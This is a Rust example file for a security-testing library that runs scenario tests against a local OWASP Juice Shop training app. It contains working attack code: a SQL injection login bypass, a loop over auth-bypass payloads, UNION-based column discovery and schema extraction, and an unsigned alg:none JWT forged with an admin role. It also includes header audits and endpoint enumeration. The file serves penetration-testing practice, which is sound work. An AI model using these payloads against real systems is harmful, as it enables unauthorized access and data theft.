//! Refined Scenario Tests - Demonstrating Clean API Usage
//!
//! Run with: cargo run --example refined_scenarios
//!
//! This example shows the improved, more ergonomic API for writing scenario tests.

use rectitude::payloads::{jwt, sqli};
use rectitude::prelude::*;
use std::sync::Arc;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║         Rectitude - Refined Scenario Examples                ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    // Example 1: Clean Authentication Flow
    println!("━━━ Example 1: Authentication with Fluent Assertions ━━━");
    auth_flow_example().await?.print_summary();

    // Example 2: SQL Injection Testing with Payloads
    println!("━━━ Example 2: SQL Injection Testing ━━━");
    sqli_test_example().await?.print_summary();

    // Example 3: Security Headers Audit
    println!("━━━ Example 3: Security Headers Audit ━━━");
    security_headers_example().await?.print_summary();

    // Example 4: JWT Manipulation
    println!("━━━ Example 4: JWT Analysis & Manipulation ━━━");
    jwt_analysis_example().await?.print_summary();

    // Example 5: API Enumeration
    println!("━━━ Example 5: API Endpoint Enumeration ━━━");
    api_enumeration_example().await?.print_summary();

    Ok(())
}

/// Example 1: Clean authentication flow with fluent assertions
async fn auth_flow_example() -> Result<ScenarioResult> {
    Scenario::new("Authentication Flow")
        .base_url("http://localhost:3000")
        // Step 1: Login using the convenience method
        .step(
            "Login with SQLi bypass",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                // Fluent assertions - chain multiple checks
                resp.expect_success()?.expect_contains("authentication")?;

                // Extract and store token in one call
                ctx.store("token", &resp, "$.authentication.token").await?;

                ok_with("Login successful")
            },
        )
        // Step 2: Access protected resource
        .step(
            "Access admin endpoint",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;

                let resp = ctx
                    .get("/rest/admin/application-configuration")
                    .bearer_auth(&token)
                    .send()
                    .await?;

                // Simple success check
                resp.expect_success()?;

                ok_with("Admin access granted")
            },
        )
        // Step 3: Verify authentication by accessing protected data
        .step(
            "Verify authentication",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;

                // Access user-specific endpoint to verify token works
                let resp = ctx.get("/api/Users/1").bearer_auth(&token).send().await?;

                // If we can access user data, authentication is working
                if resp.is_success() && resp.contains("email") {
                    println!("  [+] User data accessible");
                    ok_with("Authentication verified via user data")
                } else {
                    // Try basket endpoint
                    let resp = ctx.get("/rest/basket/1").bearer_auth(&token).send().await?;

                    if resp.is_success() {
                        println!("  [+] Basket accessible");
                        ok_with("Authentication verified via basket")
                    } else {
                        fail("Could not verify authentication")
                    }
                }
            },
        )
        .run()
        .await
}

/// Example 2: SQL Injection testing with built-in payloads
async fn sqli_test_example() -> Result<ScenarioResult> {
    Scenario::new("SQL Injection Test Suite")
        .base_url("http://localhost:3000")
        // Test authentication bypass payloads
        .step(
            "Test auth bypass payloads",
            |ctx: Arc<ScenarioContext>| async move {
                let payloads = sqli::auth_bypass_payloads();
                let mut successful = Vec::new();

                for payload in &payloads {
                    let resp = ctx
                        .post("/rest/user/login")
                        .json(&serde_json::json!({
                            "email": format!("admin@juice-sh.op{}", payload.payload),
                            "password": "anything"
                        }))
                        .send()
                        .await?;

                    if resp.is_success() {
                        successful.push(payload.name.clone());
                        // Store token from first successful payload
                        if let Ok(token) = resp.extract("$.authentication.token") {
                            ctx.set_var_async("token", token).await;
                        }
                    }
                }

                if successful.is_empty() {
                    fail("No SQLi payloads worked")
                } else {
                    println!("  [+] Successful payloads: {:?}", successful);
                    ok_with(format!("{} payloads worked", successful.len()))
                }
            },
        )
        // Test UNION injection
        .step(
            "Test UNION injection",
            |ctx: Arc<ScenarioContext>| async move {
                // Discover column count
                for n in 1..=12 {
                    let columns = (1..=n).map(|i| i.to_string()).collect::<Vec<_>>().join(",");
                    let payload = format!("')) UNION SELECT {}--", columns);

                    let resp = ctx
                        .get("/rest/products/search")
                        .query("q", &payload)
                        .send()
                        .await?;

                    if resp.is_success() && !resp.contains("SQLITE_ERROR") {
                        ctx.set_var_async("column_count", n.to_string()).await;
                        return ok_with(format!("Found {} columns", n));
                    }
                }

                fail("Could not determine column count")
            },
        )
        // Extract schema
        .step(
            "Extract database schema",
            |ctx: Arc<ScenarioContext>| async move {
                let payload =
                    "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--";

                let resp = ctx
                    .get("/rest/products/search")
                    .query("q", payload)
                    .send()
                    .await?;

                if resp.is_success() && resp.contains("CREATE TABLE") {
                    let table_count = resp.text().matches("CREATE TABLE").count();
                    println!("  [+] Extracted {} table definitions", table_count);
                    ok_with(format!("{} tables found", table_count))
                } else {
                    fail("Schema extraction failed")
                }
            },
        )
        .run()
        .await
}

/// Example 3: Security headers audit
async fn security_headers_example() -> Result<ScenarioResult> {
    Scenario::new("Security Headers Audit")
        .base_url("http://localhost:3000")
        .step(
            "Audit response headers",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/").send().await?;

                let mut issues = Vec::new();
                let mut present = Vec::new();

                // Check security headers
                let headers = [
                    ("strict-transport-security", "HSTS", true),
                    ("content-security-policy", "CSP", true),
                    ("x-content-type-options", "X-Content-Type-Options", false),
                    ("x-frame-options", "X-Frame-Options", false),
                    ("x-xss-protection", "X-XSS-Protection", false),
                    ("referrer-policy", "Referrer-Policy", false),
                ];

                for (header, name, critical) in headers {
                    match resp.header(header) {
                        Some(value) => {
                            present.push(format!("{}: {}", name, value));
                        }
                        None => {
                            let severity = if critical { "CRITICAL" } else { "WARNING" };
                            issues.push(format!("[{}] Missing {}", severity, name));
                        }
                    }
                }

                // Check for information disclosure
                if resp.header("server").is_some() {
                    issues.push("[INFO] Server header disclosed".to_string());
                }
                if resp.header("x-powered-by").is_some() {
                    issues.push("[INFO] X-Powered-By disclosed".to_string());
                }

                // Check CORS
                if let Some(cors) = resp.header("access-control-allow-origin") {
                    if cors == "*" {
                        issues.push("[WARNING] Wildcard CORS".to_string());
                    }
                }

                println!("  Present: {:?}", present);
                println!("  Issues: {:?}", issues);

                ctx.set_var_async("security_issues", issues.len().to_string())
                    .await;

                ok_with(format!("{} issues found", issues.len()))
            },
        )
        .run()
        .await
}

/// Example 4: JWT analysis and manipulation
async fn jwt_analysis_example() -> Result<ScenarioResult> {
    Scenario::new("JWT Security Analysis")
        .base_url("http://localhost:3000")
        // Get a valid JWT
        .step("Obtain valid JWT", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "admin@juice-sh.op'--",
                    "password": "x"
                }))
                .send()
                .await?;

            let token = resp.extract("$.authentication.token")?;
            ctx.set_var_async("jwt", &token).await;

            ok_with("JWT obtained")
        })
        // Analyze JWT structure
        .step(
            "Analyze JWT structure",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("jwt").await?;

                match jwt::DecodedJwt::decode(&token) {
                    Ok(decoded) => {
                        let alg = decoded
                            .header
                            .get("alg")
                            .and_then(|v| v.as_str())
                            .unwrap_or("unknown");

                        println!("  Algorithm: {}", alg);

                        // Check for sensitive data exposure
                        let payload_str = decoded.payload.to_string();
                        let mut findings = Vec::new();

                        if payload_str.contains("password") {
                            findings.push("Password exposed in JWT");
                        }
                        if payload_str.contains("secret") {
                            findings.push("Secret data in JWT");
                        }

                        if !findings.is_empty() {
                            println!("  [!] Security issues: {:?}", findings);
                        }

                        ok_with(format!("Algorithm: {}", alg))
                    }
                    Err(e) => fail(format!("JWT decode failed: {}", e)),
                }
            },
        )
        // Test alg:none vulnerability
        .step(
            "Test alg:none attack",
            |ctx: Arc<ScenarioContext>| async move {
                // Create unsigned JWT
                let unsigned = jwt::create_unsigned(&serde_json::json!({
                    "status": "success",
                    "data": {
                        "id": 1,
                        "email": "admin@juice-sh.op",
                        "role": "admin"
                    }
                }));

                let resp = ctx
                    .get("/rest/admin/application-configuration")
                    .bearer_auth(&unsigned)
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("  [!] VULNERABLE: Server accepts unsigned JWT");
                    ok_with("alg:none ACCEPTED - VULNERABLE")
                } else {
                    println!("  [+] Server correctly rejects unsigned JWT");
                    ok_with("alg:none rejected - secure")
                }
            },
        )
        .run()
        .await
}

/// Example 5: API endpoint enumeration
async fn api_enumeration_example() -> Result<ScenarioResult> {
    Scenario::new("API Endpoint Enumeration")
        .base_url("http://localhost:3000")
        .step(
            "Enumerate API endpoints",
            |ctx: Arc<ScenarioContext>| async move {
                let endpoints = [
                    "/api/Products",
                    "/api/Users",
                    "/api/Feedbacks",
                    "/api/Complaints",
                    "/api/Recycles",
                    "/api/SecurityQuestions",
                    "/api/Challenges",
                    "/rest/products/search",
                    "/rest/user/whoami",
                    "/rest/admin/application-configuration",
                ];

                let mut accessible = Vec::new();
                let mut protected = Vec::new();
                let mut not_found = Vec::new();

                for endpoint in endpoints {
                    let resp = ctx.get(endpoint).send().await?;

                    match resp.status.as_u16() {
                        200 => accessible.push(endpoint),
                        401 | 403 => protected.push(endpoint),
                        404 => not_found.push(endpoint),
                        _ => {}
                    }
                }

                println!("  Accessible: {} endpoints", accessible.len());
                println!("  Protected:  {} endpoints", protected.len());
                println!("  Not Found:  {} endpoints", not_found.len());

                for ep in &accessible {
                    println!("    [+] {}", ep);
                }

                ok_with(format!("{} accessible", accessible.len()))
            },
        )
        .step(
            "Check for verbose errors",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/api/Products/invalid").send().await?;
                let text = resp.text();

                if text.contains("stack") || text.contains("node_modules") {
                    println!("  [!] Stack trace exposed");
                    ok_with("Stack trace exposed")
                } else {
                    println!("  [+] No stack trace in errors");
                    ok()
                }
            },
        )
        .run()
        .await
}
